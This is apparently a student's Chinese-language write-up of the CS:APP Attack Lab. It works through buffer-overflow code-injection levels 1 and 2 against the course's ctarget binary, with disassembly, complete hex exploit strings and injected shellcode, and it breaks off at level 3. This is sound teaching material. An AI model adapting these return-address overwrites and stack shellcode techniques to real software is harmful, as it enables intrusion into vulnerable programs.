# Attacklab

## 实验过程中出现的问题（已发现原因但未解决）

在我的虚拟机上运行ctarget时在未开始提示输入内容时就会报段错误，用gdb调试时显示内容如下：

```
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Cookie: 0x59b997fa

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7c750d0 in __vfprintf_internal (s=0x7ffff7e1a780 <_IO_2_1_stdout_>, format=0x4032b4 "Type string:", ap=ap@entry=0x5561dbd8, mode_flags=mode_flags@entry=2) at ./stdio-common/vfprintf-internal.c:1244
1244    ./stdio-common/vfprintf-internal.c: No such file or directory.
```

Ubuntu系统安装文件为ubuntu-22.04.3-desktop-amd64.iso。系统版本Linux version 6.2.0-39-generic (buildd@lcy02-amd64-045) (x86_64-linux-gnu-gcc-11 (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #40~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Thu Nov 16 10:53:04 UTC 2

在做这个实验时是在网上找的别人做好的docker，在上面运行。只有ctarget出现这个问题，rtarget没有。

* 用gdb调试可发现出错的行数为
  
  ` 0x00007ffff7c750d0 <+160>:   movaps %xmm1,0x10(%rsp)`此时%rsp地址为0x5561d668
  
  因为在Level2出现了类似问题，所以具体参见level2.

****

# Part 1 :Code Injection Attacks

此部分实验目标This program is set up in a 
way that the stack positions will be consistent from one run to the next and so that data on the 
stack can be treated as executable code. These features make the program vulnerable to 
attacks where the exploit strings contain the byte encodings of executable code.

## Level1

level1的目标是不注入新代码，将程序重定向到现有过程。test函数会调用getbuf()函数，类似于gets()函数，不够安全，会从标准输入中读取字符串以换行符或是EOF结尾，此函数将读取内容读到一个数组中，并且并未进行边界检验，所以可能会造成栈溢出。

第一关的要求在于令getbuf()函数在返回时不返回test而是转到touch1函数。用gdb调试程序，查看getbuf函数的汇编码。

```asmatmel
Dump of assembler code for function getbuf:
=> 0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq   
```

可以看到在栈上分配了0x28即40字节的空间，则test函数的返回地址存放在最上面，所以输入字符串应该覆盖掉这40个字节的空间，然后用目标地址覆盖掉储存的返回地址。反汇编touch1函数，得到touch1的起始地址为`0x00000000004017c0`。现在应该构建攻击字符串。

实验中提供了一个工具hex2raw，它用来生成攻击字符串，它接受16进制格式的字符串进行输入，每个字节由两个16进制数字表示。传递的每2个16进制数之间应该用空格隔开，对于不同部分可以用换行符分开。所以输入的格式应该类似于“52 48 65 25 14”。因为读取的是字符，所以会在栈上储存的是其字符对应的Ascii码编码。hex3raw作用是生成anscii编码是你输入2个16进制数的字符，用来保证覆盖的代码是正确字节形式。需要输入40个占位字节，所以先输入40个“11”，然后输入touch1的地址，因为机器为小段存储，所以地址从最低位开始输入，即“c0 17 40 00 00 00 00 00”注意64位系统的地址总共64位，应该在地址前面填00补齐位数(在这关可以不用，因为覆盖的位置原本存放的是返回地址，前面本来就是0)。所以应该答案可以为：

```
11 11 11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11 11 11 
c0 17 40 00 00 00 00 00
```

用`./hex2raw < cans.txt | ./ctarget -q`运行，注意要加上参数-q，因为默认是连服务器的，用此参数令程序不要发送信息到服务器。

****

## Level2

level2需要跳转到touch2，但touch2函数需要传递cookie作为验证，所以应该将cookie写入栈中。反汇编touch2.

```asmatmel
   0x00000000004017ec <+0>:     sub    $0x8,%rsp
   0x00000000004017f0 <+4>:     mov    %edi,%edx
   0x00000000004017f2 <+6>:     movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:    cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:    jne    0x401824 <touch2+56>
   0x0000000000401804 <+24>:    mov    $0x4030e8,%esi
   0x0000000000401809 <+29>:    mov    $0x1,%edi
   0x000000000040180e <+34>:    mov    $0x0,%eax
   0x0000000000401813 <+39>:    callq  0x400df0 <__printf_chk@plt>
```

由汇编代码可以看出touch2地址为`0x00000000004017ec`，cookie通过%edi传递，%rdi是调用者保存寄存器，所以在getbuf调用Gets函数时%rdi可能会发生改变，在实验文档中提示应该注入代码将%rdi设置为cookie，然后跳转到touch2。再看看getbuf函数

```asmatmel
=> 0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq
```

主要关注栈指针的行为，函数未执行时栈指针为0x5561dca0，此时指针指向位置存放test函数的返回地址，将栈指针下移40字节，可以得到此时栈指针为`0x5561dc78`，然后读取字符输入储存在栈上，可以推测储存是从当前栈指针开始向上存储，之后控制交回getbuf函数，将栈指针指回初始位置，用ret指令弹出返回地址，同时栈指针加0x8。所以我们应该让这个ret指令转移控制到我们注入的代码，将%rdi设置为cookie，因为实验文档说明不让用jmp指令，所以我们应该继续用ret指令弹出touch2的地址，但是不能再向0x5561dca0位置上覆盖数据，会破坏前一个函数的正常执行，所以注入的代码应该可以使栈指针移动，正好我们同时有将touch2地址写在栈上的需求，所以可以用`push`指令先将栈指针自动-0x8再将touch2返回地址压入栈指针指向的位置，所以需要注入的代码为

```asmatmel
 mov   $0x59b997fa,%rdi   //将cookie值给到%rdi
 push  $0x4017ec          //压入touch2的返回地址
 ret   
```

将汇编码写入.s文件，然后编译，用如下命令

```bash
gcc -c a.s  //用gcc编译a.s文件，默认输出a.0
objdump -d a.o > a.d //反汇编到a.d
```

```
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq
```

则注入字符串的顺序应该为注入代码  填充40字节 注入代码的地址(直接注入在栈顶)。所以输入为

```
48 c7 c7 fa 97 b9 59     /* mov    $0x59b997fa,%rdi */
68 ec 17 40 00           /* push   $0x4017ec */
c3                       /* ret */    
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 78 dc 61
55 00 00 00 00
```

### 另一种解决方法

在做题时产生过另外的解决思路，就是不用push指令，用ret指令，将注入代码的地址填在原返回地址上，在这个上面填上touch2的地址，这样在getbuf返回时就会转到注入代码的执行，在注入执行完后再用ret将touch2的返回地址弹到pc，所以答案如下，但是会反馈信息

```
48 c7 c7 fa 97 b9 59    /* mov    $0x59b997fa,%rdi */
        /* push   $0x4017ec */
c3                      /* ret */
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 78 dc 61 55 00 00 00 00
ec 17 40 00 00 00 00 00
>./hex2raw < a.txt | ./ctarget

Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:0:48 C7 C7 FA 97 B9 59 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 EC 17 40 00 00 00 00 00 
```

可以看到我们成功转到了touch2，并且是合法的解法，但之后却造成了段错误，所以出现问题的函数是validate，gdb调试后可以看到出错的代码为

`0x00007f3f212eadcd <+61>:    movaps %xmm0,(%rsp)  `

这个代码很眼熟，因为在开头出错的也是类似的代码。通过查看csapp第三版书上关于浮点寄存器的信息，可以得到

```
For transferring data
between two XMM registers, it uses one of two different instructions for copying
the entire contents of one XMM register to another—namely, vmovaps for singl
exprecision and vmovapd for double-precision values. For these cases, whether the
program copies the entire register or just the low-order value affects neither the
program functionality nor the execution speed, and so using these instructions
rather than ones specific to scalar data makes no real difference. The letter ‘a’
in these instruction names stands for “aligned.” When used to read and write
memory, they will cause an exception if the address does not satisfy a 16-byte
alignment. For transferring between two registers, there is no possibility of an
incorrect alignment
```

所以movaps在传送数据到地址时，要求数据16字节对齐(及地址要是16的倍数)，否则可能出现错误。另外书中提到了强制对齐的情况

![](C:\Users\lenovo\Pictures\aligened6.png)

所以可以推测我的这台虚拟机可能要求在栈帧的边界要16字节对齐，栈指针的地址应该能被16整除，即最后一位应该是0(以16进制表示)。现在来看level2的栈指针变动。在getbuf函数开始时 %rsp = 0x5561dca0，则test函数的返回地址在此地址上，然后getbuf函数在栈上分配了40字节的空间，此时栈指针位置为 %rsp = 0x5561dc78，在运行gets函数后将要返回test函数时会释放栈空间，栈指针指回0x5561dca0，然后执行ret弹出返回地址到%pc，并且令栈指针+0x8，%rsp = 0x5561dca8，若是按照一开始的解法，转到注入代码执行push指令会让栈指针-0x8，然后执行ret指令会在令栈指针+0x8，所以栈指针位置仍然未变，同时我们注意到touch2函数在开始时会让栈指针-0x8，此时 %rsp 仍然为0x5561dca0，保持16字节对齐。

所以如果我们仍然不想用push指令的话，应该多执行一次ret指令，令栈指针再次对齐。所以输入应该让栈的结构变为(从上到下)：touch2函数的地址 + 第二个ret的地址 + 注入代码的地址(此处为0x5561dca0指向的位置) + 字节补齐 + mov 指令 + ret +ret 。

我们可以注意到 mov    $0x59b997fa,%rdi和ret 指令的字节码总共是8个字节，起始地址为0x5561dc78，所以下一个ret的地址为0x5561dc80，注意占位字符的总数，所以输入答案为

```
 48 c7 c7 fa 97 b9 59    /* mov    $0x59b997fa,%rdi */
 c3
 c3                      /* ret */
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00
 78 dc 61 55 00 00 00 00
 80 dc 61 55 00 00 00 00
 ec 17 40 00 00 00 00 00
```

此结果可以通过level2。或者只用1个ret，将touch2下面的地址改为这个ret的地址，即0x5561dc78+0x7=0x5561dc7f。

```
48 c7 c7 fa 97 b9 59    /* mov    $0x59b997fa,%rdi */
c3                      /* ret */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
78 dc 61 55 00 00 00 00
7f dc 61 55 00 00 00 00
ec 17 40 00 00 00 00 00
```

这个也可以通过。

****

## level3

level3传入字符串做参数。仍然将控制转移到touch3.先看touch3的代码

```c
11 void touch3(char *sval)
12 {
13      vlevel = 3; /* Part of validation protocol */
14     if (hexmatch(cookie, sval)) {
15             printf("Touch3!: You called touch3(\"%s\")\n", sval);
16             validate(3);}
17      else {
18             printf("Misfire: You called touch3(\"%s\")\n", sval);
19             fail(3);
20 }
21     exit(0);
22 }
```

可以看到touch3会调用函数hexmatch判断输入字符是否与cookie是否相等，输入字符数组指针是sval。hexmatch代码如下

```c
1 /* Compare string to hex represention of unsigned value */
2 int hexmatch(unsigned val, char *sval)
3 {
4      char cbuf[110];
5 /* Make position of check string unpredictable */
6      char *s = cbuf + random() % 100;
7      sprintf(s, "%.8x", val);
8      return strncmp(sval, s, 9) == 0;
9 }
```

可以看到hexmatch用100大小的字符数组储存判断字符串，并且用了随机数来保证字符串的首字节指针与数组首元素地址不一定相等，然后将cookie值保存在判断字符串中，比较其与输入字符串是否相等。实验文档中提示*sval应该是通过%rdi传递的，应该将%rdi设置为注入字符串的地址。cookie输入为字符串，根据编码注入的值应该为``接下来看汇编代码

```asmatmel

```
